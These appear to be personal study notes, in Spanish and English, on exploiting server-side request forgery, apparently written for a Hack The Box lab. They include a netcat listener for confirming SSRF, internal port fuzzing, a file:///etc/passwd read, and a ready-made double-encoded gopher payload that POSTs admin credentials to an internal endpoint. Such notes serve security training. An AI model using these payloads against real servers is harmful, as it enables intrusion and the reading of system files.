
Server-side request forgery es una vulnerabilidad donde una web hace request a ciertos recursos de otros servidores según el input del usuario y que puede ser vulnerado haciendo request a sitios que no debería 

## URL-schemes

- `http://` and `https://`: These URL schemes fetch content via HTTP/S requests. An attacker might use this in the exploitation of SSRF vulnerabilities to bypass WAFs, access restricted endpoints, or access endpoints in the internal network
- `file://`: This URL scheme reads a file from the local file system. An attacker might use this in the exploitation of SSRF vulnerabilities to read local files on the web server (LFI)
- `gopher://`: This protocol can send arbitrary bytes to the specified address. An attacker might use this in the exploitation of SSRF vulnerabilities to send HTTP POST requests with arbitrary payloads or communicate with other services such as SMTP servers or databases
## SSRF Confirmation

Para saber si es vulnerable , en burp en la request pon una url que sea una ip tuya  o simplemente la loop ip  `127.0.0.1` seguida de un puerto y haz 
`nc -lnvp <puerto>`  para ver si hace una request a tu server

## Enumeratin g the System

1. Hacer una wordlist de puertos
```shell-session
 seq 1 10000 > ports.txt
```
2. fuzzear en la request de burp
```
http://127.0.0.1:<puerto fuzz>
```
suele estar abierto el `3306` para bases de datos SQL


## Exploiting SSRF

### Basic

-Una vez tenemos confirmado SSRF podemos enumerar los directorios del servidor al que hace la request simplemente fuzzeandola.
### LFI

-A su vez podemos hacer LFI haciendo `file:///etc/passwd` en ves de la url

### POST

En caso de que queramos hacer una peticion POST a un servidor gracias a un SSRF no la podremos usar a menos que usemos el protocolo gopher

REQUEST:
```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

GOPHER
1. URL encodear la request
```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
2. URL encodear la url de antes otra vez
```
gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin
```
ya ta